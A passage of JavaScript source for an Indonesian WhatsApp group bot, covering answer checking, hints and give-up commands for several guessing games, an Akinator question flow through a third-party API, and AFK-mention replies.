await reply(JwbTrue("Tebak Bendera", tebakgame[m.chat][2]) + `\n\nKirim perintah *${prefix}tebakgame* untuk bermain lagi 🎮`)
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hintgame* untuk bantuan dan *${prefix}nyerahgame* untuk menyerah 🎮`)
 }
}
if (tebakgambar[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakgambar[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakgambar[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += tebakgambar[m.chat][2]
await reply(JwbTrue("Tebak Gambar", tebakgambar[m.chat][2]) + `\n\nKirim perintah *${prefix}tebakgambar* untuk bermain lagi 🎮`)
clearTimeout(tebakgambar[m.chat][3])
delete tebakgambar[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hintgambar* untuk bantuan dan *${prefix}nyerahgambar* untuk menyerah 🎮`)
 }
}
if (tebakkata[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkata[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkata[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += tebakkata[m.chat][2]
await reply(JwbTrue("Tebak Kata", tebakkata[m.chat][2]) + `\n\nKirim perintah *${prefix}tebakkata* untuk bermain lagi 🎮`)
clearTimeout(tebakkata[m.chat][3])
delete tebakkata[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hintkata* untuk bantuan dan *${prefix}nyerahkata* untuk menyerah 🎮`)
 }
}
if (tebakbendera[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakbendera[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakbendera[m.chat][1]))
jawaban = json.name.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += tebakbendera[m.chat][2]
await reply(JwbTrue("Tebak Bendera", tebakbendera[m.chat][2]) + `\n\nKirim perintah .tebakbendera untuk bermain lagi 🎮`)
clearTimeout(tebakbendera[m.chat][3])
delete tebakbendera[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hintbendera* untuk bantuan dan *${prefix}nyerahbendera* untuk menyerah 🎮`)
 }
}
if (caklontong[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == caklontong[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(caklontong[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += caklontong[m.chat][2]
await reply(JwbTrue("Cak Lontong", caklontong[m.chat][2]) + `\n\nKirim perintah *${prefix}caklontong* untuk bermain lagi 🎮`)
clearTimeout(caklontong[m.chat][3])
delete caklontong[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hintlontong* untuk bantuan dan *${prefix}nyerahlontong* untuk menyerah 🎮`)
 }
}
if (susunkata[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == susunkata[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(susunkata[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += susunkata[m.chat][2]
await reply(JwbTrue("Susun Kata", susunkata[m.chat][2]) + `\n\nKirim perintah *${prefix}susunkata* untuk bermain lagi 🎮`)
clearTimeout(susunkata[m.chat][3])
delete susunkata[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hintsusun* untuk bantuan dan *${prefix}nyerahsusun* untuk menyerah 🎮`)
 }
}
if (tebakkalimat[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkalimat[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkalimat[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += tebakkalimat[m.chat][2]
await reply(JwbTrue("Tebak Kalimat", tebakkalimat[m.chat][2]) + `\n\nKirim perintah *${prefix}tebakkalimat* untuk bermain lagi 🎮`)
clearTimeout(tebakkalimat[m.chat][3])
delete tebakkalimat[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hintkalimat* untuk bantuan dan *${prefix}nyerahkalimat* untuk menyerah 🎮`)
 }
}
if (siapaaku[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == siapaaku[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(siapaaku[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += siapaaku[m.chat][2]
await reply(JwbTrue("Tebak Siapa", siapaaku[m.chat][2]) + `\n\nKirim perintah *${prefix}tebaksiapa* untuk bermain lagi 🎮`)
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hintsiapa* untuk bantuan dan *${prefix}nyerahsiapa* untuk menyerah 🎮`)
 }
}
if (tekateki[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tekateki[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tekateki[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += tekateki[m.chat][2]
await reply(JwbTrue("Teka Teki", tekateki[m.chat][2]) + `\n\nKirim perintah *${prefix}tekateki* untuk bermain lagi 🎮`)
clearTimeout(tekateki[m.chat][3])
delete tekateki[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hintteki* untuk bantuan dan *${prefix}nyerahteki* untuk menyerah 🎮`)
 }
}
if (tebakkimia[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakkimia[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakkimia[m.chat][1]))
jawaban = json.unsur.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += tebakkimia[m.chat][2]
await reply(JwbTrue("Teka Kimia", tebakkimia[m.chat][2]) + `\n\nKirim perintah *${prefix}tebakkimia* untuk bermain lagi 🎮`)
clearTimeout(tebakkimia[m.chat][3])
delete tebakkimia[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hintkimia* untuk bantuan dan *${prefix}nyerahkimia* untuk menyerah 🎮`)
 }
}
if (tebaklirik[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebaklirik[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebaklirik[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += tebaklirik[m.chat][2]
await reply(JwbTrue("Teka Lirik", tebaklirik[m.chat][2]) + `\n\nKirim perintah *${prefix}tebaklirik* untuk bermain lagi 🎮`)
clearTimeout(tebaklirik[m.chat][3])
delete tebaklirik[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`🇺🇸Wrong answer\n\nSend the command *${prefix}hintlirik* for help and *${prefix}nyerahlirik* to give up 🎮\n\n🇮🇩 ❌ Jawaban salah\n\nKirim perintah *${prefix}hintlirik* untuk bantuan dan *${prefix}nyerahlirik* untuk menyerah 🎮`)
 }
}
if (tebaktebakan[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebaktebakan[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebaktebakan[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += tebaktebakan[m.chat][2]
await reply(JwbTrue("Teka Tebakan", tebaktebakan[m.chat][2]) + `\n\nKirim perintah *${prefix}tebaktebakan* untuk bermain lagi 🎮`)
clearTimeout(tebaktebakan[m.chat][3])
delete tebaktebakan[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
reply(`_Ya, Dikit Lagi!_`)
else m.reply(`❌ Jawaban salah\n\nKirim perintah *${prefix}hinttebakan* untuk bantuan dan *${prefix}nyerahtebakan* untuk menyerah 🎮`)
 }
}
//Akinator
if (akinator.hasOwnProperty(m.sender.split('@')[0]) && isCmd && ["0", "1", "2", "3", "4", "5"].includes(body)) {
            kuis = true
            var {
                server,
                frontaddr,
                session,
                signature,
                question,
                step
            } = akinator[m.sender.split('@')[0]]
            if (step == "0" && budy == "5") reply("Maaf Anda telah mencapai pertanyaan pertama")
            var ini_url = `https://api.lolhuman.xyz/api/akinator/answer?apikey=${global.lolhuman}&server=${server}&frontaddr=${frontaddr}&session=${session}&signature=${signature}&answer=${budy}&step=${step}`
            var get_result = await fetchJson(ini_url)
            var get_result = get_result.result
            if (get_result.hasOwnProperty("name")) {
                var ini_name = get_result.name
                var description = get_result.description
                ini_txt = `${ini_name} - ${description}\n\n`
                ini_txt += "*Terima Kasih*\n*Powered LoL Human*"
                await HuBotZ.sendMessage(m.chat, {
                    image: {
                        url: get_result.image
                    },
                    caption: ini_txt
                }).then(() => {
                    delete akinator[m.sender.split('@')[0]]
                    fs.writeFileSync("./game/akinator.json", JSON.stringify(akinator))
                })
                return
            }
            var {
                question,
                _,
                step
            } = get_result
            ini_txt = `${question}\n\n`
            ini_txt += "0 - Ya\n"
            ini_txt += "1 - Tidak\n"
            ini_txt += "2 - Saya Tidak Tau\n"
            ini_txt += "3 - Mungkin\n"
            ini_txt += "4 - Mungkin Tidak\n"
            ini_txt += "5 - Kembali ke Pertanyaan Sebelumnya"
            if (args[0] === '5') {
                var ini_url = `https://api.lolhuman.xyz/api/akinator/back?apikey=${global.lolhuman}&server=${server}&frontaddr=${frontaddr}&session=${session}&signature=${signature}&answer=${budy}&step=${step}`
                var get_result = await fetchJson(ini_url)
                var get_result = get_result.result
                var {
                    question,
                    _,
                    step
                } = get_result
                ini_txt = `${question}\n\n`
                ini_txt += "0 - Ya\n"
                ini_txt += "1 - Tidak\n"
                ini_txt += "2 - Saya Tidak Tau\n"
                ini_txt += "3 - Mungkin\n"
                ini_txt += "4 - Mungkin Tidak"
                ini_txt += "5 - Kembali ke Pertanyaan Sebelumnya"
            }
            HuBotZ.sendText(m.chat, ini_txt, m).then(() => {
                const data_ = akinator[m.sender.split('@')[0]]
                data_["question"] = question
                data_["step"] = step
                akinator[m.sender.split('@')[0]] = data_
                fs.writeFileSync("./game/akinator.json", JSON.stringify(akinator))
            })
        }

 if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = ms(getTimee)
reply(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}\n*Since :* ${heheh2.hours} Hours, ${heheh2.minutes} Minute, ${heheh2.seconds} seconds ago\n`)
}
}
if (afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
HuBotZ.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`, m)
}
}

async function awaitMessage(options = {}) {
  return new Promise((resolve, reject) => {
    if (typeof options !== 'object') reject(new Error('Options must be an object'));
    if (typeof options.sender !== 'string') reject(new Error('Sender must be a string'));
    if (typeof options.chatJid !== 'string') reject(new Error('ChatJid must be a string'));
    if (options.timeout && typeof options.timeout !== 'number') reject(new Error('Timeout must be a number'));
    if (options.filter && typeof options.filter !== 'function') reject(new Error('Filter must be a function'));

    const timeout = options?.timeout || undefined;
    const filter = options?.filter || (() => true);
    let interval = undefined;

    const listener = (data) => {
      const { type, messages } = data;
      if (type === "notify") {
        for (const message of messages) {
          const fromMe = message.key.fromMe;
          const chatId = message.key.remoteJid;
          const isGroup = chatId.endsWith('@g.us');
          const isStatus = chatId === 'status@broadcast';

          const sender = fromMe ? HuBotZ.user?.jid.replace(/:.*@/g, '@') : (isGroup || isStatus) ? message.key.participant.replace(/:.*@/g, '@') : chatId;
          if (sender === options.sender && chatId === options.chatJid && filter(message)) {
            HuBotZ.ev.off('messages.upsert', listener);
            clearTimeout(interval);
            resolve({ sender, message });
          }
        }
      }
    };

    HuBotZ.ev.on('messages.upsert', listener);

    if (timeout) {
      interval = setTimeout(() => {
        HuBotZ.ev.off('messages.upsert', listener);
        reject(new Error('Timeout'));
      }, timeout);
    }
  });
}

async function getMessageBody() {
  let msgWea = await awaitMessage({
    chatJid: m.chat,
    sender: m.sender,
    filter: (message) => message?.message?.extendedTextMessage?.text || message?.message?.conversation
  });
  console.log(msgWea);
  let bodyWea = msgWea?.message?.message?.extendedTextMessage?.text || msgWea?.message?.message?.conversation;
  console.log(bodyWea);

  return bodyWea;
}


switch(command) {
//===== [ G A M E | F E A T U R E ] =====\\
case 'tebakgambar': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (tebakgambar[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
addCountCmd('#tebakgambar', m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakgambar[m.chat] = [
await HuBotZ.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`
}, {
quoted: m
}), result, 250,
setTimeout(() => {
if (tebakgambar[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.jawaban}`, m)
delete tebakgambar[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hintgambar': {
if (!(m.chat in tebakgambar)) return
let json = tebakgambar[m.chat][1]
reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahgambar* Untuk Nyerah`)
addCountCmd('#hintgambar', m.sender, _cmd);
}
break
case 'nyerahgambar': {
if (!(m.chat in tebakgambar)) return
clearTimeout(tebakgambar[m.chat][3])
delete tebakgambar[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd('#nyerahgambar', m.sender, _cmd);
}
break
case 'tebakgame': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (tebakgame[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
addCountCmd('#tebakgame', m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakgame[m.chat] = [
await HuBotZ.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Gambar diatas adalah game?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik`
}, {
quoted: m
}),
result, 250,
setTimeout(() => {
if (tebakgame[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.jawaban}`, m)
delete tebakgame[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hintgame': {
if (!(m.chat in tebakgame)) return
let json = tebakgame[m.chat][1]
reply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahgame* Untuk Nyerah`)
addCountCmd('#hintgame', m.sender, _cmd);
}
break
case 'nyerahgame': {
if (!(m.chat in tebakgame)) return
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd('#nyerahgame', m.sender, _cmd);
}
break
case "tebakkata": {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (tebakkata[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
addCountCmd('#tebakkata', m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakkata[m.chat] = [
await HuBotZ.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebakkata[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.jawaban}`, m)
delete tebakkata[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'family100': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if ('family100'+m.chat in _family100) {
m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
addCountCmd('#family100', m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await HuBotZ.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
db.data.users[m.sender].glimit -= 1
break
case 'hintkata': {
if (!(m.chat in tebakkata)) return
let json = tebakkata[m.chat][1]
reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahkata* Untuk Nyerah`)
addCountCmd('#hintkata', m.sender, _cmd);
}
break
case 'nyerahkata': {
if (!(m.chat in tebakkata)) return
clearTimeout(tebakkata[m.chat][3])
delete tebakkata[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd('#nyerahkata', m.sender, _cmd);
}
break
case 'tebakbendera': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (tebakbendera[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
addCountCmd('#tebakbendera', m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.name)
tebakbendera[m.chat] = [
await HuBotZ.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Gambar diatas adalah bendera negara?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik`
}, {
quoted: m
}),
result, 250,
setTimeout(() => {
if (tebakbendera[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.name}`)
delete tebakbendera[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hintbendera': {
if (!(m.chat in tebakbendera)) return
let json = tebakbendera[m.chat][1]
reply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik: *${prefix}nyerahbendera* Untuk Menyerah`)
addCountCmd('#hintbendera', m.sender, _cmd);
}
break
case 'nyerahbendera': {
if (!(m.chat in tebakbendera)) return
clearTimeout(tebakbendera[m.chat][3])
delete tebakbendera[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd('#nyerahbendera', m.sender, _cmd);
}
break
case 'tebakkalimat': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (tebakkalimat[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
addCountCmd('#tebakkalimat', m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakkalimat[m.chat] = [
await HuBotZ.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebakkalimat[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.jawaban}`)
delete tebakkalimat[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hintkalimat': {
if (!(m.chat in tebakkalimat)) return
let json = tebakkalimat[m.chat][1]
reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahkalimat* Untuk Menyerah`)
addCountCmd('#hintkalimat', m.sender, _cmd);
}
break
case 'nyerahkalimat': {
if (!(m.chat in tebakkalimat)) return
clearTimeout(tebakkalimat[m.chat][3])
delete tebakkalimat[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd('#nyerahkalimat', m.sender, _cmd);
}
break
case 'tebaksiapa': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (siapaaku[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
addCountCmd('#tebaksiapa', m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
siapaaku[m.chat] = [
await HuBotZ.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (siapaaku[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.jawaban}`)
delete siapaaku[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hintsiapa': {
if (!(m.chat in siapaaku)) return
let json = siapaaku[m.chat][1]
reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahsiapa* Untuk Menyerah`)
addCountCmd('#hintsiapa', m.sender, _cmd);
}
break
case 'nyerahsiapa': {
if (!(m.chat in siapaaku)) return
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd('#nyerahsiapa', m.sender, _cmd);
}
break
case 'tebakkimia': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (tebakkimia[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
addCountCmd('#tebakkimia', m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.unsur)
tebakkimia[m.chat] = [
await HuBotZ.sendText(m.chat, `Apa Arti Dari Simbol : *${result.lambang}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebakkimia[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.unsur}`)
delete tebakkimia[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hintkimia': {
if (!(m.chat in tebakkimia)) return
let json = tebakkimia[m.chat][1]
reply('```' + json.unsur.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahkimia* Untuk Nyerah`)
addCountCmd('#hintkimia', m.sender, _cmd);
}
break
case 'nyerahkimia': {
if (!(m.chat in tebakkimia)) return
clearTimeout(tebakkimia[m.chat][3])
delete tebakkimia[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd('#nyerahkimia', m.sender, _cmd);
}
break
case 'tebaklirik': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (tebaklirik[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
addCountCmd('#tebaklirik', m.sender, _cmd);
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebaklirik[m.chat] = [
await HuBotZ.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebaklirik[m.chat]) {
return reply(`*WaktuHabis!*\n*Jawaban:* ${result.jawaban}`)
delete tebaklirik[m.chat]
}
}, 120000)
]
}
db.data.users[m.sender].glimit -= 1
break
case 'hintlirik': {
if (!(m.chat in tebaklirik)) return
let json = tebaklirik[m.chat][1]
reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', `Ketik *${prefix}nyerahlirik* Untuk Nyerah`)
addCountCmd('#hintlirik', m.sender, _cmd);
}
break
case 'nyerahlirik': {
if (!(m.chat in tebaklirik)) return
clearTimeout(tebaklirik[m.chat][3])
delete tebaklirik[m.chat]
return HuBotZ.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😂`}, {quoted: fkontak})
addCountCmd('#nyerahlirik', m.sender, _cmd);
}
break
case 'tebaktebakan': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return reply(mess.OnlyGrup)
if (!isPremium && db.data.users[m.sender].glimit < 1) return m.reply(mess.EndLimitGame)
if (tebaktebakan[m.chat]) return HuBotZ.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
addCountCmd('#tebaktebakan', m.sender, _cmd);
